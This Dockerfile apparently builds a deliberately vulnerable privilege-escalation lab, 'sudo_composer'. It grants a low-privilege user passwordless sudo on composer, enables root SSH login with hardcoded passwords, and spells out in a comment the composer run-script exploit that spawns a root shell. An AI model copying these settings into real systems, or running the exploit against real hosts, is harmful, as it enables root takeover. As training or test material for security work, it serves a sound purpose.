FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_composer
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/composer as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and composer
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        composer \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify composer is installed
RUN which composer && ls -la /usr/bin/composer

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# composer run-script can execute arbitrary commands defined in composer.json.
# The exploit:
#   echo '{"scripts":{"x":"/bin/sh"}}' > composer.json
#   sudo composer run-script x
# This spawns a root shell.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/composer" > /etc/sudoers.d/composer && \
    chmod 440 /etc/sudoers.d/composer

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]